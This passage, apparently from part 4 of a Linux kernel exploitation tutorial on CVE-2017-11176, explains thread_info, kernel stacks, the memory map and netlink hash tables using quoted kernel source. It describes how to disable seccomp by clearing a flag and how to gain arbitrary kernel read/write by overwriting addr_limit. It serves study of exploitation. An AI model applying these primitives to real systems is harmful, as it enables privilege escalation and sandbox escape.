</code></pre></div><p>We will not explain what is going on with seccomp past this point. Long story short, if the syscall is forbidden, a SIGKILL signal will be delivered to the faulty process.</p><p>The important thing is: <strong>clearing the <em>TIF_SECCOMP</em> flag</strong> of the current running thread (i.e. <em>thread_info</em>) is "enough" to disable seccomp checks.</p><p><strong>WARNING</strong>: This is only true for the "current" thread, forking/execve'ing from here will "re-enable" seccomp (see <em>task_struct</em>).</p><h3 id="gaining-arbitrary-readwrite">Gaining Arbitrary Read/Write</h3><p>Now let's check the <strong>addr_limit</strong> field of <em>thread_info</em>.</p><p>If you look at various system call implementations, you will see that most of them call <strong>copy_from_user()</strong> at the very beginning to make a copy from userland data into kernel-land. Failing to do so can lead to <em>time-of-check time-of-use (TOCTOU)</em> bugs (e.g. change userland value after it has been checked).</p><p>In the very same way, system call code must call <strong>copy_to_user()</strong> to copy a result from kernelland into userland data.</p><div class="highlight"><pre><span></span><code><span class="kt">long</span><span class="w"> </span><span class="nf">copy_from_user</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">to</span><span class="p">,</span><span class="w">   </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">n</span><span class="p">);</span><span class="w"></span>
<span class="kt">long</span><span class="w"> </span><span class="nf">copy_to_user</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">to</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">n</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: The <em>__user</em> macro does nothing, this is just a hint for kernel developers that this data is a pointer to userland memory. In addition, some tools like <a href="https://lwn.net/Articles/689907/">sparse</a> can benefit from it.</p><p>Both <em>copy_from_user()</em> and <em>copy_to_user()</em> are architecture dependent functions. On x86-64 architecture, they are implemented in <em>arch/x86/lib/copy_user_64.S</em>.</p><p><strong>NOTE</strong>: If you don't like reading assembly code, there is a <strong>generic</strong> architecture that can be found in <em>include/asm-generic/*</em>. It can help you to figure out what an architecture-dependent function is "supposed to do".</p><p>The <em>generic</em> (i.e. not x86-64) code for <em>copy_from_user()</em> looks like this:</p><div class="highlight"><pre><span></span><code><span class="c1">// from [include/asm-generic/uaccess.h]</span>

<span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">copy_from_user</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">to</span><span class="p">,</span><span class="w"></span>
<span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">might_sleep</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">access_ok</span><span class="p">(</span><span class="n">VERIFY_READ</span><span class="p">,</span><span class="w"> </span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="n">n</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">__copy_from_user</span><span class="p">(</span><span class="n">to</span><span class="p">,</span><span class="w"> </span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="n">n</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">else</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The "software" access rights checks are performed in <em>access_ok()</em> while <em>__copy_from_user()</em> unconditionally copy <em>n</em> bytes from <em>from</em> to <em>to</em>. In other words, if you see a <em>__copy_from_user()</em> where parameters havn't been checked, there is a serious security vulnerability. Let's get back to the x86-64 architecture.</p><p>Prior to executing the actual copy, the parameter marked with <strong>__user</strong> is checked against the <em>addr_limit</em> value of the current <em>thread_info</em>. If the range (from+n) is below <em>addr_limit</em>, the copy is performed, otherwise <em>copy_from_user()</em> returns a non-null value indicating an error.</p><p>The <em>addr_limit</em> value is set and retrieved using the <strong>set_fs()</strong> and <strong>get_fs()</strong> macros respectively:</p><div class="highlight"><pre><span></span><code><span class="cp">#define get_fs()    (current_thread_info()-&gt;addr_limit)</span>
<span class="cp">#define set_fs(x)   (current_thread_info()-&gt;addr_limit = (x))</span>
</code></pre></div><p>For instance, when you do an <strong>execve()</strong> syscall, the kernel tries to find a proper "binary loader". Assuming the binary is an ELF, the <em>load_elf_binary()</em> function is invoked and it ends by calling the <strong>start_thread()</strong> function:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="c1">// from [arch/x86/kernel/process_64.c]</span>

<span class="w">      </span><span class="kt">void</span><span class="w"> </span><span class="nf">start_thread</span><span class="p">(</span><span class="k">struct</span> <span class="nc">pt_regs</span><span class="w"> </span><span class="o">*</span><span class="n">regs</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">new_ip</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">new_sp</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">loadsegment</span><span class="p">(</span><span class="n">fs</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">loadsegment</span><span class="p">(</span><span class="n">es</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">loadsegment</span><span class="p">(</span><span class="n">ds</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">load_gs_index</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">ip</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="n">new_ip</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">sp</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="n">new_sp</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">percpu_write</span><span class="p">(</span><span class="n">old_rsp</span><span class="p">,</span><span class="w"> </span><span class="n">new_sp</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">cs</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="n">__USER_CS</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">ss</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="n">__USER_DS</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="mh">0x200</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">set_fs</span><span class="p">(</span><span class="n">USER_DS</span><span class="p">);</span><span class="w">                        </span><span class="c1">// &lt;-----</span>
<span class="w">        </span><span class="cm">/*</span>
<span class="cm">         * Free the old FP and other extended state</span>
<span class="cm">         */</span><span class="w"></span>
<span class="w">        </span><span class="n">free_thread_xstate</span><span class="p">(</span><span class="n">current</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The <em>start_thread()</em> function resets the current <em>thread_info's addr_limit</em> value to <strong>USER_DS</strong> which is defined here:</p><div class="highlight"><pre><span></span><code><span class="cp">#define MAKE_MM_SEG(s)  ((mm_segment_t) { (s) })</span>
<span class="cp">#define TASK_SIZE_MAX   ((1UL &lt;&lt; 47) - PAGE_SIZE)</span>
<span class="cp">#define USER_DS     MAKE_MM_SEG(TASK_SIZE_MAX)</span>
</code></pre></div><p>That is, a userland address is valid if it is below <strong>0x7ffffffff000</strong> (used to be 0xc0000000 on 32-bits).</p><p>As you might already guessed, <strong>overwriting the <em>addr_limit</em> value leads to arbitrary read/write primitive</strong>. Ideally, we want something that does:</p><div class="highlight"><pre><span></span><code><span class="cp">#define KERNEL_DS   MAKE_MM_SEG(-1UL)   </span><span class="c1">// &lt;----- 0xffffffffffffffff</span>
<span class="n">set_fs</span><span class="p">(</span><span class="n">KERNEL_DS</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>If we achieve to do this, we <strong>disable a software protection mechanism</strong>. Again, this is "software" only! The hardware protections are still on, accessing kernel memory directly from userland will provoke a page fault that will kill your exploit (SIGSEGV) because the running level is still CPL=3 (see the "page fault" section).</p><p>Since, we want read/write kernel memory from userland, we can actually ask the kernel to do it for us through a syscall that calls <em>copy_{to|from}_user()</em> function while <strong>providing a kernel pointer in "__user" marked parameter</strong>.</p><h3 id="final-note-about-thread_info">Final note about <em>thread_info</em></h3><p>As you might notice by the three examples shown here, the <em>thread_info</em> structure is of utter importance in general as well as for exploitation scenarios. We showed that:</p><ol><li>While leaking a kernel thread stack pointer, we can retrieve a pointer to the current <em>task_struct</em> (hence lots of kernel data structures)</li><li>By overwriting the <em>flags</em> field we can disable seccomp protection and eventually escape some sandboxes</li><li>We can gain an arbitrary read/write primitive by changing the value of the <em>addr_limit</em> field</li></ol><p>Those are just a sample of things you can do with <em>thread_info</em>. This is a small but critical structure.</p><h2 id="virtual-memory-map">Virtual Memory Map</h2><p>In the previous section, we saw that the "highest" valid userland address was:</p><div class="highlight"><pre><span></span><code><span class="cp">#define TASK_SIZE_MAX   ((1UL &lt;&lt; 47) - PAGE_SIZE) </span><span class="c1">// == 0x00007ffffffff000</span>
</code></pre></div><p>One might wonder where does this "47" comes from?</p><p>In the early AMD64 architecture, designers thought that addressing 2^64 memory is somehow "too big" and force to add another level of page table (performance hit). For this reason, it has been decided that only the lowest 48-bits of an address should be used to translate a virtual address into a physical address.</p><p>However, if the userland address space ranges from 0x0000000000000000 to 0x00007ffffffff000 what will the kernel address space ? The answer is: 0xffff800000000000 to 0xffffffffffffffff.</p><p>That is, the bits [48:63] are:</p><ul><li>all cleared for user addresses</li><li>all set for kernel addresses</li></ul><p>More specifically, AMD imposed that those [48:63] are the same as the 47 bit. Otherwise, an exception is thrown. Addresses respecting this convention are called <strong>canonical form addresses</strong>. With such model, it is still possible to address 256TB of memory (half for user, half for kernel).</p><p>The space between 0x00007ffffffff000 and 0xffff800000000000 are <strong>unused memory addresses</strong> (also called "non-canonical addresses"). That is, the virtual memory layout for a 64-bit process is:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/virtual_memory_map.png" title="Virtual Memory Map"><figcaption class="figcaption figure-caption text-center">virtual_memory_map.png</figcaption></figure><p></p><p>The above diagram is the "big picture". You can get a more precise virtual memory map in the Linux kernel documentation: <em>Documentation/x86/x86_64/mm.txt</em>.</p><p><strong>NOTE</strong>: The "guard hole" address range is needed by some hypervisor (e.g. Xen).</p><p>In the end, when you see an address starting with "0xffff8*" or higher, you can be sure that it is a kernel one.</p><h2 id="kernel-thread-stacks">Kernel Thread Stacks</h2><p>In Linux (x86-64 architecture), there are two kinds of kernel stacks:</p><ul><li><strong>thread stacks</strong>: 16k-bytes stacks for every active thread</li><li><strong>specialized stacks</strong>: a set of <em>per-cpu</em> stacks used in special operations</li></ul><p>You may want to read the Linux kernel documentation for additional/complementary information: <em>Documentation/x86/x86_64/kernel-stacks</em>.</p><p>First, let's describe the <em>thread stacks</em>. When a new thread is created (i.e. a new <em>task_struct</em>), the kernel does a "fork-like" operation by calling <strong>copy_process()</strong>. The later allocates a new <em>task_struct</em> (remember, there is one <em>task_struct</em> per thread) and copies most of the parent's <em>task_struct</em> into the new one.</p><p>However, depending on how the task is created, some resources can be either shared (e.g. memory is shared in a multithreaded application) or "copied" (e.g. the libc's data). In the later case, if the thread modified some data a new separated version is created: this is called <strong>copy-on-write</strong> (i.e. it impacts only the current thread and not every thread importing the libc).</p><p>In other words, a process is never created "from scratch" but starts by being a copy of its parent process (be it <em>init</em>). The "differences" are fixed later on.</p><p>Furthermore, there is some thread specific data, one of them being the kernel thread stack. During the creation/duplication process, <em>dup_task_struct()</em> is called very early:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="k">static</span><span class="w"> </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">dup_task_struct</span><span class="p">(</span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">orig</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">tsk</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">thread_info</span><span class="w"> </span><span class="o">*</span><span class="n">ti</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">stackend</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tsk_fork_get_node</span><span class="p">(</span><span class="n">orig</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="n">prepare_to_copy</span><span class="p">(</span><span class="n">orig</span><span class="p">);</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="n">tsk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alloc_task_struct_node</span><span class="p">(</span><span class="n">node</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">tsk</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="n">ti</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">alloc_thread_info_node</span><span class="p">(</span><span class="n">tsk</span><span class="p">,</span><span class="w"> </span><span class="n">node</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ti</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="n">free_task_struct</span><span class="p">(</span><span class="n">tsk</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">     </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arch_dup_task_struct</span><span class="p">(</span><span class="n">tsk</span><span class="p">,</span><span class="w"> </span><span class="n">orig</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">     </span><span class="n">tsk</span><span class="o">-&gt;</span><span class="n">stack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ti</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut ...</span>

<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">     </span><span class="n">setup_thread_stack</span><span class="p">(</span><span class="n">tsk</span><span class="p">,</span><span class="w"> </span><span class="n">orig</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut ...</span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>

<span class="w">      </span><span class="cp">#define THREAD_ORDER  2</span>

<span class="w">      </span><span class="cp">#define alloc_thread_info_node(tsk, node)             \</span>
<span class="cp">      ({                                    \</span>
<span class="cp">        struct page *page = alloc_pages_node(node, THREAD_FLAGS,    \</span>
<span class="cp">                     THREAD_ORDER);     \</span>
<span class="cp">        struct thread_info *ret = page ? page_address(page) : NULL; \</span>
<span class="cp">                        \</span>
<span class="cp">        ret;                                \</span>
<span class="cp">      })</span>
</code></pre></div><p>The previous code does the following:</p><ul><li><strong>[0]</strong>: allocates a new <em>struct task_struct</em> using the Slab allocator</li><li><strong>[1]</strong>: <strong>allocates a new thread stack</strong> using the Buddy allocator</li><li><strong>[2]</strong>: copies the <em>orig</em> task_struct content to the new <em>tsk</em> <em>task_struct</em> (differences will be fixed later on)</li><li><strong>[3]</strong>: changes the <em>task_struct</em>'s <em>stack</em> pointer to <strong>ti</strong>. The new thread has now its dedicated thread stack <strong>and its own <em>thread_info</em></strong></li><li><strong>[4]</strong>: copies the content of <em>orig</em>'s <em>thread_info</em> to the new <em>tsk</em>'s <em>thread_info</em> and fixes the <em>task</em> field.</li></ul><p>One might be confused with [1]. The macro <em>alloc_thread_info_node()</em> is supposed to allocate a <em>struct thread_info</em> and yet, it allocates a thread stack. The reason being <strong><em>thread_info</em> structures lives in thread stacks</strong>:</p><div class="highlight"><pre><span></span><code><span class="cp">#define THREAD_SIZE  (PAGE_SIZE &lt;&lt; THREAD_ORDER)</span>

<span class="k">union</span> <span class="nc">thread_union</span><span class="w"> </span><span class="p">{</span><span class="w">                                </span><span class="c1">// &lt;----- this is an "union"</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">thread_info</span><span class="w"> </span><span class="n">thread_info</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">stack</span><span class="p">[</span><span class="n">THREAD_SIZE</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">)];</span><span class="w">  </span><span class="c1">// &lt;----- 16k-bytes</span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>Except for the <em>init</em> process, <em>thread_union</em> is not used anymore (on x86-64) but the layout is still the same:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/thread_stack.png" title="Thread Stack Layout"><figcaption class="figcaption figure-caption text-center">thread_stack.png</figcaption></figure><p></p><p><strong>NOTE</strong>: The <em>KERNEL_STACK_OFFSET</em> exists for "optimization reasons" (avoid a sub operation in some cases). You can ignore it for now.</p><p>The <em>STACK_END_MAGIC</em> is here to mitigate kernel thread stack overflow exploitation. As explained earlier, overwriting <em>thread_info</em> data can lead to nasty things (it also holds function pointers in the <em>restart_block</em> field).</p><p>Since <em>thread_info</em> is at the top of this region, you hopefully understand now why, by masking out <em>THREAD_SIZE</em>, you can retrieve the <em>thread_info</em> address from any <em>kernel thread stack</em> pointer.</p><p>In the previous diagram, one might notice the <strong>kernel_stack</strong> pointer. This is a "per-cpu" variable (i.e. one for each cpu) declared here:</p><div class="highlight"><pre><span></span><code><span class="c1">// [arch/x86/kernel/cpu/common.c]</span>

<span class="n">DEFINE_PER_CPU</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">,</span><span class="w"> </span><span class="n">kernel_stack</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"></span>
<span class="w">    </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">init_thread_union</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">KERNEL_STACK_OFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">THREAD_SIZE</span><span class="p">;</span><span class="w"></span>
</code></pre></div><p>Initially, <em>kernel_stack</em> points to the <em>init</em> thread stack (i.e. <em>init_thread_union</em>). However, during a <a href="https://en.wikipedia.org/wiki/Context_switch">Context Switch</a>, this (per-cpu) variable is updated:</p><div class="highlight"><pre><span></span><code><span class="cp">#define task_stack_page(task)   ((task)-&gt;stack)</span>

<span class="n">__switch_to</span><span class="p">(</span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">prev_p</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">next_p</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ..</span>

<span class="w">    </span><span class="n">percpu_write</span><span class="p">(</span><span class="n">kernel_stack</span><span class="p">,</span><span class="w"></span>
<span class="w">          </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">task_stack_page</span><span class="p">(</span><span class="n">next_p</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"></span>
<span class="w">          </span><span class="n">THREAD_SIZE</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">KERNEL_STACK_OFFSET</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ..</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>In the end, the <em>current thread_info</em> is retrieved with:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="k">struct</span> <span class="nc">thread_info</span><span class="w"> </span><span class="o">*</span><span class="n">current_thread_info</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">thread_info</span><span class="w"> </span><span class="o">*</span><span class="n">ti</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">ti</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">percpu_read_stable</span><span class="p">(</span><span class="n">kernel_stack</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"></span>
<span class="w">              </span><span class="n">KERNEL_STACK_OFFSET</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">THREAD_SIZE</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ti</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><strong>The <em>kernel_stack</em> pointer is used while entering a system call. It replaces the current (userland) <em>rsp</em> which is restored while exiting system call.</strong></p><h2 id="understanding-netlink-data-structures">Understanding Netlink Data Structures</h2><p>Let's have a closer look to netlink data structures. This will help us understand where and what are the dangling pointers we are trying to repair.</p><p>Netlink has a "global" array <strong>nl_table</strong> of type <em>netlink_table</em>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [net/netlink/af_netlink.c]</span>

<span class="k">struct</span> <span class="nc">netlink_table</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="n">hash</span><span class="p">;</span><span class="w">        </span><span class="c1">// &lt;----- we will focus on this</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">hlist_head</span><span class="w"> </span><span class="n">mc_list</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">listeners</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">nl_nonroot</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">groups</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">mutex</span><span class="w"> </span><span class="o">*</span><span class="n">cb_mutex</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">module</span><span class="w"> </span><span class="o">*</span><span class="n">module</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">registered</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="k">struct</span> <span class="nc">netlink_table</span><span class="w"> </span><span class="o">*</span><span class="n">nl_table</span><span class="p">;</span><span class="w">  </span><span class="c1">// &lt;----- the "global" array</span>
</code></pre></div><p>The <em>nl_table</em> array is initialized at <em>boot-time</em> with <em>netlink_proto_init()</em>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/netlink.h]</span>

<span class="cp">#define NETLINK_ROUTE       0   </span><span class="cm">/* Routing/device hook              */</span><span class="cp"></span>
<span class="cp">#define NETLINK_UNUSED      1   </span><span class="cm">/* Unused number                */</span><span class="cp"></span>
<span class="cp">#define NETLINK_USERSOCK    2   </span><span class="cm">/* Reserved for user mode socket protocols  */</span><span class="cp"></span>
<span class="c1">// ... cut ...</span>
<span class="cp">#define MAX_LINKS 32        </span>

<span class="c1">// [net/netlink/af_netlink.c]</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">__init</span><span class="w"> </span><span class="n">netlink_proto_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="n">nl_table</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kcalloc</span><span class="p">(</span><span class="n">MAX_LINKS</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">nl_table</span><span class="p">),</span><span class="w"> </span><span class="n">GFP_KERNEL</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>In other words, there is <strong>one <em>netlink_table</em> per protocol</strong> (<em>NETLINK_USERSOCK</em> being one of them). Furthermore, each of those netlink tables embedded a <strong>hash</strong> field of type <em>struct nl_pid_hash</em>:</p><div class="highlight"><pre><span></span><code><span class="c1">// [net/netlink/af_netlink.c]</span>

<span class="k">struct</span> <span class="nc">nl_pid_hash</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">hlist_head</span><span class="w"> </span><span class="o">*</span><span class="n">table</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">rehash_time</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mask</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">shift</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">entries</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">max_shift</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">u32</span><span class="w"> </span><span class="n">rnd</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>This structure is used to manipulate a <strong>netlink hash table</strong>. To that means the following fields are used:</p><ul><li><em>table</em>: an array of <em>struct hlist_head</em>, the actual <strong>hash table</strong></li><li><em>reshash_time</em>: used to reduce the number of "dilution" over time</li><li><em>mask</em>: number of buckets (minus 1), hence mask the result of the hash function</li><li><em>shift</em>: a number of bits (i.e. order) used to compute an "average" number of elements (i.e. the <strong>load factor</strong>). Incidentally, represents the number of time the table has grown.</li><li><em>entries</em>: total numbers of element in the hash table</li><li><em>max_shift</em>: a number of bits (i.e. order). The maximum amount of time the table can grow, hence the maximum number of buckets</li><li><em>rnd</em>: a random number used by the hash function</li></ul><p>Before going back to the netlink hash table implementation, let's have an overview of the hash table API in Linux.</p><h2 id="linux-hash-table-api">Linux Hash Table API</h2><p>The hash table itself is manipulated with other typical Linux data structures: <strong>struct hlist_head</strong> and <strong>struct hlist_node</strong>. Unlike <em>struct list_head</em> (cf. "Core Concept #3") which just uses the same type to represent either the list head and the elements, the hash list uses two types defined here:</p><div class="highlight"><pre><span></span><code><span class="c1">// [include/linux/list.h]</span>

<span class="cm">/*</span>
